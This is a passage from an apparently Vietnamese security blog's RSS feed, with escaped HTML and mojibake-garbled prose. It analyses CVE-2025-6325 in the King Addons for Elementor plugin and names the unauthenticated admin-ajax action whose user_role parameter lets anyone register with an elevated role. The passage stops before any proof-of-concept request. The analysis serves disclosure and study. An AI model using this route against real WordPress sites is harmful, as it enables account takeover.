1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;manage_woocommerce&lt;/code&gt; l√† quy·ªÅn &lt;strong&gt;qu√° r·ªông&lt;/strong&gt; cho thao t√°c to√†n c·ª•c.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Shop Manager kh√¥ng n√™n c√≥ quy·ªÅn thay ƒë·ªïi system options&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;update_option()&lt;/code&gt; ph·∫£i ƒëi k√®m &lt;strong&gt;whitelist option&lt;/strong&gt; ho·∫∑c &lt;strong&gt;gi·ªõi h·∫°n role Administrator&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/dokan-lite/vulnerability/wordpress-dokan-plugin-4-0-8-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Dokan Plugin &amp;lt;= 4.1.3 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6325 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-03-cve-2025-6325/</link>
      <pubDate>Sat, 03 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-03-cve-2025-6325/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;L·ªó h·ªïng ph√¢n quy·ªÅn kh√¥ng ch√≠nh x√°c (Incorrect Privilege Assignment)&lt;/strong&gt; trong plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; c·ªßa &lt;strong&gt;KingAddons.com&lt;/strong&gt; cho ph√©p &lt;strong&gt;leo thang ƒë·∫∑c quy·ªÅn (Privilege Escalation)&lt;/strong&gt;.&#xA;L·ªó h·ªïng n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; t·ª´ &lt;strong&gt;kh√¥ng x√°c ƒë·ªãnh (n/a)&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;phi√™n b·∫£n 51.1.36 tr·ªü xu·ªëng (&amp;lt;= 51.1.36)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6325&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6325&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 51.1.36&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 51.1.37&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/king-addons/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress King Addons for Elementor Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;51.1.14&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;51.1.37&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Elementor Plugin&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nh∆∞ c√°i t√™n &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;, plugin c·∫ßn &lt;strong&gt;Elementor&lt;/strong&gt; ƒë·ªÉ ho·∫°t ƒë·ªông. Plugin n√†y cung c·∫•p nhi·ªÅu widget v√† t√≠nh nƒÉng m·ªü r·ªông cho &lt;strong&gt;Elementor&lt;/strong&gt; nh·∫±m h·ªó tr·ª£ x√¢y d·ª±ng giao di·ªán website.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/widget.png&#34; title=&#34;C√°c widget c·ªßa King Addons for Elementor&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/widget.png&#34; data-sub-html=&#34;&lt;h2&gt;Widget&lt;/h2&gt;&lt;p&gt;C√°c widget c·ªßa King Addons for Elementor&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/widget.png&#39; alt=&#34;Widget&#34; height=&#34;994&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;C√°c widget c·ªßa King Addons for Elementor&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/li&gt;&#xA;&lt;li&gt;L·ªó h·ªïng ƒë∆∞·ª£c ghi nh·∫≠n ·∫£nh h∆∞·ªüng t·ª´ &lt;strong&gt;kh√¥ng x√°c ƒë·ªãnh (n/a)&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;phi√™n b·∫£n &lt;code&gt;51.1.36&lt;/code&gt; tr·ªü xu·ªëng&lt;/strong&gt;, tuy nhi√™n &lt;strong&gt;tr√™n th·ª±c t·∫ø l·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° ·ªü m·ªôt s·ªë phi√™n b·∫£n n·∫±m trong ph·∫°m vi ƒë∆∞·ª£c c√¥ng b·ªë&lt;/strong&gt;, do ƒë√≥ kh√¥ng ph·∫£i t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë∆∞·ª£c li·ªát k√™ ƒë·ªÅu c√≤n t·ªìn t·∫°i v·∫•n ƒë·ªÅ b·∫£o m·∫≠t n√†y.&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Khi th·ª±c hi·ªán diff code gi·ªØa phi√™n b·∫£n ƒë∆∞·ª£c c√¥ng b·ªë l√† ·∫£nh h∆∞·ªüng g·∫ßn nh·∫•t (&lt;code&gt;v51.1.36&lt;/code&gt;) v√† b·∫£n v√° (&lt;code&gt;v51.1.37&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff1.png&#34; title=&#34;Diff code 1&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/diff1.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff1&lt;/h2&gt;&lt;p&gt;Diff code 1&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff1.png&#39; alt=&#34;Diff1&#34; height=&#34;465&#34; width=&#34;1837&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code 1&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff2.png&#34; title=&#34;Diff code 2&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/diff2.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff2&lt;/h2&gt;&lt;p&gt;Diff code 2&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff2.png&#39; alt=&#34;Diff2&#34; height=&#34;250&#34; width=&#34;1875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code 2&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Quan s√°t s·ª± thay ƒë·ªïi c·ªßa c√°c file tr√™n, t√¥i kh√¥ng th·∫•y c√≥ s·ª± thay ƒë·ªïi n√†o li√™n quan ƒë·∫øn l·ªó h·ªïng &lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Th·ª±c hi·ªán search sink v·ªõi phi√™n b·∫£n &lt;code&gt;v51.1.36&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/sink.png&#34; title=&#34;Search sink v51.1.36&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/sink.png&#34; data-sub-html=&#34;&lt;h2&gt;Sink&lt;/h2&gt;&lt;p&gt;Search sink v51.1.36&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/sink.png&#39; alt=&#34;Sink&#34; height=&#34;761&#34; width=&#34;1688&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search sink v51.1.36&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta th·∫•y, t·∫°i &lt;code&gt;file Login_Register_Form_Ajax.php&lt;/code&gt;, h√†m &lt;code&gt;Login_Register_Form_Ajax::handle_register_ajax()&lt;/code&gt; cho ph√©p nh·∫≠n tr·ª±c ti·∫øp gi√° tr·ªã &lt;code&gt;$user_role&lt;/code&gt; t·ª´ request v√† g√°n v√†o m·∫£ng &lt;code&gt;$user_data&lt;/code&gt; tr∆∞·ªõc khi g·ªçi &lt;code&gt;wp_insert_user()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒê√¢y ch√≠nh l√† &lt;strong&gt;sink&lt;/strong&gt; c·ªßa l·ªó h·ªïng, v√¨ d·ªØ li·ªáu ƒë·∫ßu v√†o kh√¥ng ƒë√°ng tin c·∫≠y ƒë∆∞·ª£c truy·ªÅn v√†o tr·ª±c ti·∫øp, g√¢y ra &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;handle_register_ajax()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;    &amp;#39;wp_ajax_nopriv_king_addons_user_register&amp;#39;,&#xA;    [&amp;#39;King_Addons\Widgets\Login_Register_Form\Login_Register_Form_Ajax&amp;#39;, &amp;#39;handle_register_ajax&amp;#39;]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong ƒë√≥:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; l√† action hook d√†nh cho &lt;strong&gt;t·∫•t c·∫£ ng∆∞·ªùi d√πng&lt;/strong&gt;, k·ªÉ c·∫£ nh·ªØng ng∆∞·ªùi ch∆∞a ƒëƒÉng nh·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;Khi g·ª≠i request t·ªõi endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi &lt;code&gt;action=king_addons_user_register&lt;/code&gt;, WordPress s·∫Ω g·ªçi &lt;code&gt;handle_register_ajax()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;King_Addons\Widgets\Login_Register_Form\Login_Register_Form_Ajax&#39;&lt;/code&gt; li√™n quan ƒë·∫øn widget &lt;strong&gt;Login/Register Form&lt;/strong&gt; c·ªßa plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/form.png&#34; title=&#34;Login/Register Form c·ªßa King Addons for Elementor&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/form.png&#34; data-sub-html=&#34;&lt;h2&gt;Form&lt;/h2&gt;&lt;p&gt;Login/Register Form c·ªßa King Addons for Elementor&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/form.png&#39; alt=&#34;Form&#34; height=&#34;857&#34; width=&#34;1916&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Login/Register Form c·ªßa King Addons for Elementor&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Khi ng∆∞·ªùi d√πng g·ª≠i form ƒëƒÉng k√Ω n√†y, d·ªØ li·ªáu nh·∫≠p v√†o s·∫Ω ƒë∆∞·ª£c &lt;strong&gt;truy·ªÅn tr·ª±c ti·∫øp v√†o h√†m &lt;code&gt;handle_register_ajax()&lt;/code&gt;&lt;/strong&gt; x·ª≠ l√Ω:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/r_enable.png&#34; title=&#34;T√≠nh nƒÉng user registration&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/r_enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Registration Enable&lt;/h2&gt;&lt;p&gt;T√≠nh nƒÉng user registration&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/r_enable.png&#39; alt=&#34;Registration Enable&#34; height=&#34;453&#34; width=&#34;1620&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T√≠nh nƒÉng user registration&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;H√†m ch·ªâ ti·∫øp t·ª•c x·ª≠ l√Ω n·∫øu t√≠nh nƒÉng &lt;strong&gt;user registration&lt;/strong&gt; ƒë∆∞·ª£c b·∫≠t, ta c√≥ th·ªÉ b·∫≠t n√≥ trong Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/membership.png&#34; title=&#34;B·∫≠t t√≠nh nƒÉng user registration&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/membership.png&#34; data-sub-html=&#34;&lt;h2&gt;Member Ship&lt;/h2&gt;&lt;p&gt;B·∫≠t t√≠nh nƒÉng user registration&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/membership.png&#39; alt=&#34;Member Ship&#34; height=&#34;878&#34; width=&#34;1074&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫≠t t√≠nh nƒÉng user registration&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi ti·∫øp t·ª•c ph√¢n t√≠ch phi√™n b·∫£n &lt;strong&gt;v51.1.36&lt;/strong&gt;, t√¥i nh·∫≠n th·∫•y m·ªôt comment gi·∫£i th√≠ch r·∫±ng ƒëo·∫°n code b√™n d∆∞·ªõi l√† &lt;strong&gt;b·∫£n v√° b·∫£o m·∫≠t&lt;/strong&gt;, nh·∫±m ch·ªëng &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/analysis.png&#34; title=&#34;Ph·∫ßn comment&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/analysis.png&#34; data-sub-html=&#34;&lt;h2&gt;Analysis&lt;/h2&gt;&lt;p&gt;Ph·∫ßn comment&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/analysis.png&#39; alt=&#34;Analysis&#34; height=&#34;519&#34; width=&#34;1721&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Ph·∫ßn comment&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;So s√°nh v·ªõi danh s√°ch c√°c l·ªó h·ªïng ƒë√£ c√¥ng b·ªë c·ªßa plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/compare.png&#34; title=&#34;So s√°nh&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/compare.png&#34; data-sub-html=&#34;&lt;h2&gt;Compare&lt;/h2&gt;&lt;p&gt;So s√°nh&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/compare.png&#39; alt=&#34;Compare&#34; height=&#34;1021&#34; width=&#34;1537&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;So s√°nh&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Trong danh s√°ch n√†y ch·ªâ c√≥ &lt;strong&gt;1 l·ªó h·ªïng Privilege Escalation&lt;/strong&gt; ƒë∆∞·ª£c ghi nh·∫≠n.&lt;/li&gt;&#xA;&lt;li&gt;Tuy nhi√™n, ·ªü phi√™n b·∫£n &lt;strong&gt;v51.1.36&lt;/strong&gt;, l·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√°.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; ƒêi·ªÅu n√†y c√≥ nghƒ©a r·∫±ng &lt;strong&gt;phi√™n b·∫£n v51.1.36 kh√¥ng c√≤n c√≥ th·ªÉ b·ªã khai th√°c l·ªó h·ªïng n√†y&lt;/strong&gt;.&#xA;ƒê√¢y ch√≠nh l√† l√Ω do t·∫°i ph·∫ßn &lt;a href=&#34;#requirements&#34;&gt;&lt;strong&gt;Requirements&lt;/strong&gt;&lt;/a&gt; t√¥i y√™u c·∫ßu s·ª≠ d·ª•ng phi√™n b·∫£n &lt;strong&gt;v51.1.14&lt;/strong&gt;, v√¨ phi√™n b·∫£n n√†y &lt;strong&gt;ch∆∞a ch·ª©a b·∫£n v√°&lt;/strong&gt;, v·∫´n c√≤n l·ªó h·ªïng ƒë·ªÉ ph·ª•c v·ª• ph√¢n t√≠ch ho·∫∑c th·ª≠ nghi·ªám.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/role.png&#34; title=&#34;Code v51.1.14&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/role.png&#34; data-sub-html=&#34;&lt;h2&gt;Code v51.1.14&lt;/h2&gt;&lt;p&gt;Code v51.1.14&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/role.png&#39; alt=&#34;Code v51.1.14&#34; height=&#34;521&#34; width=&#34;1771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Code v51.1.14&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; 